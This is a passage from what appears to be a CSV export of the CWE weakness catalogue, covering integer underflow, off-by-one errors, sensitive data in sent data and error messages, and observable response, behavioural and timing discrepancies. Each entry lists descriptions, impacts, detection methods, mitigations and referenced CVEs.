NAME:CERT C Secure Coding:ENTRY ID:INT18-C:ENTRY NAME:Evaluate integer expressions in a larger size before comparing or assigning to that size:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT30-C:ENTRY NAME:Ensure that unsigned integer operations do not wrap:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT32-C:ENTRY NAME:Ensure that operations on signed integers do not result in overflow:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT35-C:ENTRY NAME:Evaluate integer expressions in a larger size before comparing or assigning to that size::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM07-C:ENTRY NAME:Ensure that the arguments to calloc(), when multiplied, do not wrap:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM35-C:ENTRY NAME:Allocate sufficient memory for an object::TAXONOMY NAME:WASC:ENTRY ID:3:ENTRY NAME:Integer Overflows::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 7.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SR-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 7.2::\",::92::,\"::TYPE:Relationship:NOTE:Integer overflows can be primary to buffer overflows when they cause less memory to be allocated than expected.::TYPE:Terminology:NOTE:Integer overflow is sometimes used to cover several types of errors, including signedness errors, or buffer overflows that involve manipulation of integer data types instead of characters. Part of the confusion results from the fact that 0xffffffff is -1 in a signed context. Other confusion also arises because of the role that integer overflows have in chains. A wraparound is a well-defined, standard behavior that follows specific rules for how to handle situations when the intended numeric value is too large or too small to be represented, as specified in standards such as C11. Overflow is sometimes conflated with wraparound but typically indicates a non-standard or undefined behavior. The overflow term is sometimes used to indicate cases where either the maximum or the minimum is exceeded, but others might only use overflow to indicate exceeding the maximum while using underflow for exceeding the minimum. Some people use overflow to mean any value outside the representable range - whether greater than the maximum, or less than the minimum - but CWE uses underflow for cases in which the intended result is less than the minimum. See [REF-1440] for additional explanation of the ambiguity of terminology.::TYPE:Other:NOTE:While there may be circumstances in which the logic intentionally relies on wrapping - such as with modular arithmetic in timers or counters - it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs.::\",\n191,\"Integer Underflow (Wrap or Wraparound)\",Base,Draft,\"The product subtracts one value from another, such that the result is less than the minimum allowable integer value, which produces a value that is not equal to the correct result.\",\"This can happen in signed and unsigned cases.\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Integer underflow:DESCRIPTION:Integer underflow is sometimes used to identify signedness errors in which an originally positive number becomes negative as a result of subtraction. However, there are cases of bad subtraction in which unsigned integers are involved, so it's not always a signedness issue. Integer underflow is occasionally used to describe array index errors in which the index is negative.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Instability:NOTE:This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.::SCOPE:Integrity:IMPACT:Modify Memory:NOTE:If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.::SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:NOTE:This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2004-0816:DESCRIPTION:Integer underflow in firewall via malformed packet.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0816::REFERENCE:CVE-2004-1002:DESCRIPTION:Integer underflow by packet with invalid length.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1002::REFERENCE:CVE-2005-0199:DESCRIPTION:Long input causes incorrect length calculation.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0199::REFERENCE:CVE-2005-1891:DESCRIPTION:Malformed icon causes integer underflow in loop counter variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1891::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Integer underflow (wrap or wraparound)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT30-C:ENTRY NAME:Ensure that unsigned integer operations do not wrap:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT32-C:ENTRY NAME:Ensure that operations on signed integers do not result in overflow:MAPPING FIT:Imprecise::\",,\"\",\n193,\"Off-by-one Error\",Base,Draft,\"A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:617:VIEW ID:1000::NATURE:CanPrecede:CWE ID:170:VIEW ID:1000::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:off-by-five:DESCRIPTION:An off-by-five error was reported for sudo in 2002 (CVE-2002-0184), but that is more like a length calculation error.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Instability:NOTE:This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.::SCOPE:Integrity:IMPACT:Modify Memory:NOTE:If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.::SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:NOTE:This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:When copying character arrays or using character manipulation methods, the correct size parameter must be used to account for the null terminator that needs to be added at the end of the array. Some examples of functions susceptible to this weakness in C include strcpy(), strncpy(), strcat(), strncat(), printf(), sprintf(), scanf() and sscanf().::\",\"::REFERENCE:CVE-2003-0252:DESCRIPTION:Off-by-one error allows remote attackers to cause a denial of service and possibly execute arbitrary code via requests that do not contain newlines.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0252::REFERENCE:CVE-2001-1391:DESCRIPTION:Off-by-one vulnerability in driver allows users to modify kernel memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1391::REFERENCE:CVE-2002-0083:DESCRIPTION:Off-by-one error allows local users or remote malicious servers to gain privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0083::REFERENCE:CVE-2002-0653:DESCRIPTION:Off-by-one buffer overflow in function usd by server allows local users to execute arbitrary code as the server user via .htaccess files with long entries.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0653::REFERENCE:CVE-2002-0844:DESCRIPTION:Off-by-one buffer overflow in version control system allows local users to execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0844::REFERENCE:CVE-1999-1568:DESCRIPTION:Off-by-one error in FTP server allows a remote attacker to cause a denial of service (crash) via a long PORT command.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1568::REFERENCE:CVE-2004-0346:DESCRIPTION:Off-by-one buffer overflow in FTP server allows local users to gain privileges via a 1024 byte RETR command.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0346::REFERENCE:CVE-2004-0005:DESCRIPTION:Multiple buffer overflows in chat client allow remote attackers to cause a denial of service and possibly execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0005::REFERENCE:CVE-2003-0356:DESCRIPTION:Multiple off-by-one vulnerabilities in product allow remote attackers to cause a denial of service and possibly execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0356::REFERENCE:CVE-2001-1496:DESCRIPTION:Off-by-one buffer overflow in server allows remote attackers to cause a denial of service and possibly execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1496::REFERENCE:CVE-2004-0342:DESCRIPTION:This is an interesting example that might not be an off-by-one.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0342::REFERENCE:CVE-2001-0609:DESCRIPTION:An off-by-one enables a terminating null to be overwritten, which causes 2 strings to be merged and enable a format string.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0609::REFERENCE:CVE-2002-1745:DESCRIPTION:Off-by-one error allows source code disclosure of files with 4 letter extensions that match an accepted 3-letter extension.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1745::REFERENCE:CVE-2002-1816:DESCRIPTION:Off-by-one buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1816::REFERENCE:CVE-2002-1721:DESCRIPTION:Off-by-one error causes an snprintf call to overwrite a critical internal variable with a null value.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1721::REFERENCE:CVE-2003-0466:DESCRIPTION:Off-by-one error in function used in many products leads to a buffer overflow during pathname management, as demonstrated using multiple commands in an FTP server.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0466::REFERENCE:CVE-2003-0625:DESCRIPTION:Off-by-one error allows read of sensitive memory via a malformed request.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0625::REFERENCE:CVE-2006-4574:DESCRIPTION:Chain: security monitoring product has an off-by-one error that leads to unexpected length values, triggering an assertion.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4574::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Off-by-one Error::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR31-C:ENTRY NAME:Guarantee that storage for strings has sufficient space for character data and the null terminator::\",,\"::TYPE:Relationship:NOTE:This is not always a buffer overflow. For example, an off-by-one error could be a factor in a partial comparison, a read from the wrong memory location, an incorrect conditional, etc.::\",\n201,\"Insertion of Sensitive Information Into Sent Data\",Base,Draft,\"The code transmits data to another actor, but a portion of the data includes sensitive information that should not be accessible to that actor.\",\"Sensitive information could include data that is sensitive in and of itself (such as credentials or private messages), or otherwise useful in the further exploitation of the system (such as internal file system structure).\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:209:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:202:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Read Memory:IMPACT:Read Application Data:NOTE:Sensitive data may be exposed to attackers.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Specify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data.::PHASE:Implementation:DESCRIPTION:Ensure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent.::PHASE:System Configuration:DESCRIPTION:Setup default error messages so that unexpected errors do not disclose sensitive information.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2022-0708:DESCRIPTION:Collaboration platform does not clear team emails in a response, allowing leak of email addresses:LINK:https://www.cve.org/CVERecord?id=CVE-2022-0708::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Accidental leaking of sensitive information through sent data::\",::12::217::612::613::618::619::621::622::623::,\"\",\n204,\"Observable Response Discrepancy\",Base,Incomplete,\"The product provides different responses to incoming requests in a way that reveals internal state information to an unauthorized actor outside of the intended control sphere.\",\"This issue frequently occurs during authentication, where a difference in failed-login messages could allow an attacker to determine if the username is valid or not. These exposures can be inadvertent (bug) or intentional (design).\",::NATURE:ChildOf:CWE ID:203:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.::\",\"::REFERENCE:CVE-2002-2094:DESCRIPTION:This, and others, use .. attacks and monitor error responses, so there is overlap with directory traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2094::REFERENCE:CVE-2001-1483:DESCRIPTION:Enumeration of valid usernames based on inconsistent responses:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1483::REFERENCE:CVE-2001-1528:DESCRIPTION:Account number enumeration via inconsistent responses.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1528::REFERENCE:CVE-2004-2150:DESCRIPTION:User enumeration via discrepancies in error messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2150::REFERENCE:CVE-2005-1650:DESCRIPTION:User enumeration via discrepancies in error messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1650::REFERENCE:CVE-2004-0294:DESCRIPTION:Bulletin Board displays different error messages when a user exists or not, which makes it easier for remote attackers to identify valid users and conduct a brute force password guessing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0294::REFERENCE:CVE-2004-0243:DESCRIPTION:Operating System, when direct remote login is disabled, displays a different message if the password is correct, which allows remote attackers to guess the password via brute force methods.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0243::REFERENCE:CVE-2002-0514:DESCRIPTION:Product allows remote attackers to determine if a port is being filtered because the response packet TTL is different than the default TTL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0514::REFERENCE:CVE-2002-0515:DESCRIPTION:Product sets a different TTL when a port is being filtered than when it is not being filtered, which allows remote attackers to identify filtered ports by comparing TTLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0515::REFERENCE:CVE-2001-1387:DESCRIPTION:Product may generate different responses than specified by the administrator, possibly leading to an information leak.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1387::REFERENCE:CVE-2004-0778:DESCRIPTION:Version control system allows remote attackers to determine the existence of arbitrary files and directories via the -X command for an alternate history file, which causes different error messages to be returned.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0778::REFERENCE:CVE-2004-1428:DESCRIPTION:FTP server generates an error message if the user name does not exist instead of prompting for a password, which allows remote attackers to determine valid usernames.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1428::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Response discrepancy infoleak::\",::331::332::541::580::,\"::TYPE:Relationship:NOTE:can overlap errors related to escalated privileges::\",\n205,\"Observable Behavioral Discrepancy\",Base,Incomplete,\"The product's behaviors indicate important differences that may be observed by unauthorized actors in a way that reveals (1) its internal state or decision process, or (2) differences from other products with equivalent functionality.\",\"Ideally, a product should provide as little information about its internal operations as possible. Otherwise, attackers could use knowledge of these internal operations to simplify or optimize their attack. In some cases, behavioral discrepancies can be used by attackers to form a side channel.\",::NATURE:ChildOf:CWE ID:203:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:514:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2002-0208:DESCRIPTION:Product modifies TCP/IP stack and ICMP error messages in unusual ways that show the product is in use.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0208::REFERENCE:CVE-2004-2252:DESCRIPTION:Behavioral infoleak by responding to SYN-FIN packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2252::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Behavioral Discrepancy Infoleak::TAXONOMY NAME:WASC:ENTRY ID:45:ENTRY NAME:Fingerprinting::\",::541::580::,\"\",\n208,\"Observable Timing Discrepancy\",Base,Incomplete,\"Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.\",\"In security-relevant contexts, even small variations in timing can be exploited by attackers to indirectly infer certain details about the product's internal operations. For example, in some cryptographic algorithms, attackers can use timing differences to infer certain properties about a private key, making the key easier to guess. Timing discrepancies effectively form a timing side channel.\",::NATURE:ChildOf:CWE ID:203:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:385:VIEW ID:1000::NATURE:CanPrecede:CWE ID:327:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2019-10071:DESCRIPTION:Java-oriented framework compares HMAC signatures using String.equals() instead of a constant-time algorithm, causing timing discrepancies:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10071::REFERENCE:CVE-2019-10482:DESCRIPTION:Smartphone OS uses comparison functions that are not in constant time, allowing side channels:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10482::REFERENCE:CVE-2014-0984:DESCRIPTION:Password-checking function in router terminates validation of a password entry when it encounters the first incorrect character, which allows remote attackers to obtain passwords via a brute-force attack that relies on timing differences in responses to incorrect password guesses, aka a timing side-channel attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-0984::REFERENCE:CVE-2003-0078:DESCRIPTION:SSL implementation does not perform a MAC computation if an incorrect block cipher padding is used, which causes an information leak (timing discrepancy) that may make it easier to launch cryptographic attacks that rely on distinguishing between padding and MAC verification errors, possibly leading to extraction of the original plaintext, aka the Vaudenay timing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0078::REFERENCE:CVE-2000-1117:DESCRIPTION:Virtual machine allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1117::REFERENCE:CVE-2003-0637:DESCRIPTION:Product uses a shorter timeout for a non-existent user than a valid user, which makes it easier for remote attackers to guess usernames and conduct brute force password guessing.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0637::REFERENCE:CVE-2003-0190:DESCRIPTION:Product immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0190::REFERENCE:CVE-2004-1602:DESCRIPTION:FTP server responds in a different amount of time when a given username exists, which allows remote attackers to identify valid usernames by timing the server response.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1602::REFERENCE:CVE-2005-0918:DESCRIPTION:Browser allows remote attackers to determine the existence of arbitrary files by setting the src property to the target filename and using Javascript to determine if the web page immediately stops loading, which indicates whether the file exists or not.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0918::\",::Cryptography::Authentication::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Timing discrepancy infoleak::\",::462::541::580::,\"::TYPE:Relationship:NOTE:Often primary in cryptographic applications and algorithms.::\",\n209,\"Generation of Error Message Containing Sensitive Information\",Base,Draft,\"The product generates an error message that includes sensitive information about its environment, users, or associated data.\",\"The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more serious attacks. The error message may be created in different ways: self-generated: the source code explicitly constructs the error message and delivers it externally-generated: the external environment, such as a language interpreter, handles the error and constructs its own message, whose contents are not under direct control by the programmer An attacker may use the contents of error messages to help launch another, more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of .. sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:200:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:755:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:System Configuration::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Often this will either reveal sensitive information which may be used for a later attack or private information stored in the server.::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness generally requires domain-specific interpretation using manual analysis. However, the number of potential error conditions may be too large to cover completely within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Analysis:DESCRIPTION:Automated methods may be able to detect certain idioms automatically, such as exposed stack traces or pathnames, but violation of business rules or privacy requirements is not typically feasible.:EFFECTIVENESS:Moderate::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. Error conditions may be triggered with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.:EFFECTIVENESS:Moderate::METHOD:Manual Dynamic Analysis:DESCRIPTION:Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.)::\",\"::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.::PHASE:Implementation:DESCRIPTION:Handle exceptions internally and do not display errors containing potentially sensitive information to a user.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation Build and Compilation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Debugging information should not make its way into a production release.::PHASE:Implementation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Debugging information should not make its way into a production release.::PHASE:System Configuration:DESCRIPTION:Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.::PHASE:System Configuration:DESCRIPTION:Create default error pages or messages that do not leak any information.::\",\"::REFERENCE:CVE-2008-2049:DESCRIPTION:POP3 server reveals a password in an error message after multiple APOP commands are sent. Might be resultant from another weakness.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2049::REFERENCE:CVE-2007-5172:DESCRIPTION:Program reveals password in error message if attacker can trigger certain database errors.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5172::REFERENCE:CVE-2008-4638:DESCRIPTION:Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4638::REFERENCE:CVE-2008-1579:DESCRIPTION:Existence of user names can be determined by requesting a nonexistent blog and reading the error message.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1579::REFERENCE:CVE-2007-1409:DESCRIPTION:Direct request to library file in web application triggers pathname leak in error message.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1409::REFERENCE:CVE-2008-3060:DESCRIPTION:Malformed input to login page causes leak of full path when IMAP call fails.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3060::REFERENCE:CVE-2005-0603:DESCRIPTION:Malformed regexp syntax leads to information exposure in error message.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0603::REFERENCE:CVE-2017-9615:DESCRIPTION:verbose logging stores admin credentials in a world-readablelog file:LINK:https://www.cve.org/CVERecord?id=CVE-2017-9615::REFERENCE:CVE-2018-1999036:DESCRIPTION:SSH password for private key stored in build log:LINK:https://www.cve.org/CVERecord?id=CVE-2018-1999036::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Accidental leaking of sensitive information through error messages::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A6:ENTRY NAME:Information Leakage and Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A7:ENTRY NAME:Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR01-J:ENTRY NAME:Do not allow exceptions to 